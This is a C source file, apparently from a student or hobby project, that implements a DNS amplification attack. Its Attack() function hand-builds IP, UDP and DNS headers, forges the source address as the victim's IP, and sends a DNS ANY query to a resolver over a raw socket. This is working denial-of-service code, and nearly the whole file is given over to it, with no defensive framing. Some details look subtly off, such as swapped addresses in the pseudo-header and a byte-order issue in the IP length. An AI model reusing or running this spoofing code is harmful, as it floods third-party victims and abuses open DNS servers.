#include "dns.h"

#define UDP_OFFSET sizeof(ip_header)
#define DNS_OFFSET sizeof(udp_header) + UDP_OFFSET
#define QUERY_OFFSET sizeof(dns_header) + DNS_OFFSET
#define ALL_OFFSET sizeof(query) + QUERY_OFFSET

// Same as checksum used in Xiao's code, should probably share the function 
unsigned short csum(unsigned short *ptr,int nbytes) 
{
	register long sum;
	unsigned short oddbyte;
	register short answer;

	sum=0;
	while(nbytes>1) {
		sum+=*ptr++;
		nbytes-=2;
	}
	if(nbytes==1) {
		oddbyte=0;
		*((unsigned char *)&oddbyte)=*(unsigned char *)ptr;
		sum+=oddbyte;
	}

	sum = (sum>>16)+(sum & 0xffff);
	sum = sum + (sum>>16);
	answer=(short)~sum;
	
	return(answer);
}

/*
	FormatDNSBody
	Takes a pointer to the DNS requests portion of the packet
	Formats it as an ANY request
*/
void FormatDNSBody(unsigned char * dns,unsigned char * host) 
{
	int lock = 0 , i;
	strcat((char*)host,".");
	for(i = 0 ; i < strlen((char*)host) ; i++) 
	{
		if(host[i]=='.') 
		{
			*dns++ = i-lock;
			for(;lock<i;lock++) 
			{
				*dns++=host[lock];
			}
			lock++;
		}
	}
	*dns++=0x00;
}

/*
	MakePesudoHeader
	Makes the pseudo header used to calculate the checksum
*/
void MakePseudoHeader(pseudo_header *header, char *sender_ip, char *dest_ip, int padding){
	header->daddr = inet_addr(sender_ip);
	header->saddr = inet_addr(dest_ip);
	header->filler = 0;
	header->protocol = IPPROTO_UDP;
	header->len = htons(QUERY_OFFSET + padding);
}

/*
	MakeDNSHeader
	Takes a pointer to the DNS header, and formats it as a proper DNS header
*/
void MakeDNSHeader(dns_header *header){
	header->id = 1;
	header->flags = htons(256);
	header->qcount = htons(1);
	header->ans = 0;
	header->auth = 0;
	header->add = 0;
}

/*
	MakeUDPHeader
	Takes pointer to the UDP header, formats with the specified ports
*/
//udphdr struct reference
//http://www.cse.scu.edu/~dclark/am_256_graph_theory/linux_2_6_stack/structudphdr.html
void MakeUDPHeader(udp_header *header, int source_port, int dest_port, int padding){
	header->source = htons(source_port);
	header->dest = htons(dest_port);
	header->len = htons(ALL_OFFSET + padding - sizeof(ip_header));
	header->check = 0;
}

/*
	MakeIPHeader
	Formats the IP header through a pointer, using ths specified IP addresses 
*/
//iphdr struct reference
//http://www.cse.scu.edu/~dclark/am_256_graph_theory/linux_2_6_stack/structiphdr.html
void MakeIPHeader(ip_header *header, char *sender_ip, char *dest_ip, int padding){
	header->version = 4;
	header->ihl = 5;
	header->tos = 0;
	header->tot_len = ALL_OFFSET + padding;
	header->id = 0;
	header->frag_off = 0;
	header->ttl = 64;
	header->protocol = IPPROTO_UDP;
	header->check = 0;
	//http://linux.die.net/man/3/inet_addr
	header->saddr = inet_addr(sender_ip);
	header->daddr = inet_addr(dest_ip);
}

/*
	Attack
	The function that should be called to launch an attack
	It basically just calls the above functions to construct all of the needed headers 
	and request body. It the sends the datagram over a raw socket.
*/
void Attack(char *target_ip, int target_port, char *dns_ip, int dns_port,
	unsigned char *dns_record)
{
	//Set up datagram and pointers to the specific headers/data
	char datagram[4096];
	memset(datagram, 0, 4096);

	pseudo_header psh;
	ip_header *ip = (ip_header *) datagram;
	udp_header *udp = (udp_header *) &datagram[UDP_OFFSET];
	dns_header *dns = (dns_header *) &datagram[DNS_OFFSET];
	unsigned char *dns_name = (unsigned char *) &datagram[QUERY_OFFSET];


	unsigned char dns_rcrd[32];
	strcpy(dns_rcrd, dns_record);
	FormatDNSBody(dns_name , dns_rcrd);
	
	query *q = (query *) &datagram[QUERY_OFFSET + strlen(dns_name) + 1];
	q->qtype = htons(0x00ff); //255 for * type
	q->qclass = htons(0x1);
	
    //Need to set up a sockaddr_in for later on
    struct sockaddr_in dns_addr;
    dns_addr.sin_family = AF_INET;
    dns_addr.sin_port = htons(dns_port);
    dns_addr.sin_addr.s_addr = inet_addr(dns_ip);

    //IP header
    MakeIPHeader(ip, target_ip, dns_ip, strlen(dns_name)+1);
	ip->check = csum((unsigned short *)datagram, ip->tot_len);
	
	int i;

	//UDP header
    MakeUDPHeader(udp, target_port, dns_port, strlen(dns_name)+1);
	
    //DNS header
    MakeDNSHeader(dns);

	// Pseudoheader creation and checksum calculation
	MakePseudoHeader(&psh, target_ip, dns_ip, strlen(dns_name));

	int pssize = sizeof(pseudo_header) + DNS_OFFSET + (strlen(dns_name)+1);
    char *pseudogram = malloc(pssize);
	
    memcpy(pseudogram, (char *)&psh, sizeof(pseudo_header));
    memcpy(pseudogram + sizeof(pseudo_header), udp, sizeof(udp_header) + sizeof(dns_header) + (strlen(dns_name)+1) + sizeof(query));
		
    udp->check = csum((unsigned short *)pseudogram, pssize);
    
    // Create socket and send the datagram
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if(s < 0){
    	printf("Socket error");
    	return;
    }
    else sendto(s, datagram, ip->tot_len, 0, (struct sockaddr *)&dns_addr, sizeof(dns_addr));
    
	free(pseudogram);
	close(s);
	
	return;
}
